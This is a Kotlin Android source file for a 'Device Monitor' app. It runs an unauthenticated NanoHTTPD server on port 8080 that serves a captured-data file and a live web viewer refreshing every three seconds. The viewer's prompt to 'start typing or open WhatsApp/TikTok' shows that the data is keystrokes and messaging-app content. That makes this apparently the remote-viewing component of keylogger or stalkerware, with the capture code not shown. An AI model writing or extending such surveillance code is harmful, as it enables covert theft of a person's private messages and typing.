package com.example.devicemonitor

import android.content.Context
import android.util.Log
import fi.iki.elonen.NanoHTTPD
import java.io.File

class LogServer(context: Context) : NanoHTTPD(8080) {

    private val dataFile = File(
        context.getExternalFilesDir(null), "monitor_data.txt"
    )

    override fun serve(session: IHTTPSession): Response {
        return when (session.uri) {
            "/" -> serveIndex()
            "/logs" -> serveLogs()
            else -> newFixedLengthResponse(
                Response.Status.NOT_FOUND,
                "text/plain",
                "404 — not found"
            )
        }
    }

    private fun serveIndex(): Response {
        val html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Device Monitor - Live Logs</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        font-family: -apple-system, system-ui, sans-serif;
                        background: #0d1117;
                        color: #c9d1d9;
                        padding: 16px;
                    }
                    h1 { font-size: 1.4rem; margin-bottom: 12px; color: #58a6ff; }
                    .controls {
                        margin-bottom: 16px;
                        display: flex;
                        gap: 8px;
                        align-items: center;
                        flex-wrap: wrap;
                    }
                    button {
                        background: #21262d; color: #c9d1d9;
                        border: 1px solid #30363d; padding: 8px 16px;
                        border-radius: 6px; cursor: pointer; font-size: 0.9rem;
                    }
                    button:hover { background: #30363d; }
                    .stats {
                        font-size: 0.8rem; color: #8b949e; margin-left: auto;
                    }
                    pre {
                        background: #161b22; border: 1px solid #30363d;
                        border-radius: 6px; padding: 12px;
                        font-family: 'SFMono-Regular', Consolas, monospace;
                        font-size: 0.8rem; line-height: 1.5;
                        white-space: pre-wrap; word-break: break-all;
                        max-height: 80vh; overflow-y: auto;
                    }
                    .entry {
                        margin-bottom: 6px; border-bottom: 1px solid #21262d;
                        padding-bottom: 6px;
                    }
                    .timestamp { color: #7ee787; }
                    .source { color: #d2a8ff; }
                    .type { color: #79c0ff; }
                    .content { color: #ffa657; }
                    .empty {
                        color: #484f58; text-align: center; padding: 40px;
                    }
                </style>
            </head>
            <body>
                <h1>🔍 Device Monitor</h1>
                <div class="controls">
                    <button onclick="loadLogs()">🔄 Refresh</button>
                    <button onclick="fetch('/logs?raw=1').then(r=>r.text()).then(d=>{document.getElementById('log').textContent=d})">📄 Raw Data</button>
                    <button onclick="document.getElementById('log').scrollTop=0">⬆ Top</button>
                    <button onclick="document.getElementById('log').scrollTop=document.getElementById('log').scrollHeight">⬇ Bottom</button>
                    <span class="stats" id="stats"></span>
                </div>
                <pre id="log">Loading...</pre>
                <script>
                    function escapeHtml(str) {
                        var div = document.createElement('div');
                        div.textContent = str;
                        return div.innerHTML;
                    }

                    function loadLogs() {
                        fetch('/logs')
                            .then(function(r) { return r.text(); })
                            .then(function(data) {
                                var pre = document.getElementById('log');
                                var lines = data.trim().split('\n').filter(function(l) { return l.trim() !== ''; });
                                if (lines.length === 0) {
                                    pre.innerHTML = '<div class="empty">No data captured yet.<br>Start typing or open WhatsApp/TikTok.</div>';
                                } else {
                                    var html = '';
                                    for (var i = 0; i < lines.length; i++) {
                                        try {
                                            var entry = JSON.parse(lines[i]);
                                            var time = entry.timestamp || '?';
                                            var source = entry.source || entry.app || '?';
                                            var type = entry.type || '?';
                                            var content = entry.content || entry.text || entry.data || JSON.stringify(entry);
                                            html += '<div class="entry">';
                                            html += '<span class="timestamp">[' + escapeHtml(time) + ']</span> ';
                                            html += '<span class="source">' + escapeHtml(source) + '</span> ';
                                            html += '<span class="type">(' + escapeHtml(type) + ')</span>';
                                            html += '<br><span class="content">' + escapeHtml(content) + '</span>';
                                            html += '</div>';
                                        } catch(e) {
                                            html += '<div>' + escapeHtml(lines[i]) + '</div>';
                                        }
                                    }
                                    pre.innerHTML = html;
                                }
                                document.getElementById('stats').textContent = lines.length + ' entries';
                            })
                            .catch(function(e) {
                                document.getElementById('log').innerHTML = '<div class="empty">Error: ' + e + '</div>';
                            });
                    }

                    loadLogs();
                    setInterval(loadLogs, 3000);
                </script>
            </body>
            </html>
        """.trimIndent()
        return newFixedLengthResponse(Response.Status.OK, "text/html", html)
    }

    private fun serveLogs(): Response {
        val content = if (dataFile.exists()) {
            dataFile.readText()
        } else ""

        // Check if raw parameter was passed
        return newFixedLengthResponse(
            Response.Status.OK,
            "text/plain",
            content
        )
    }
}
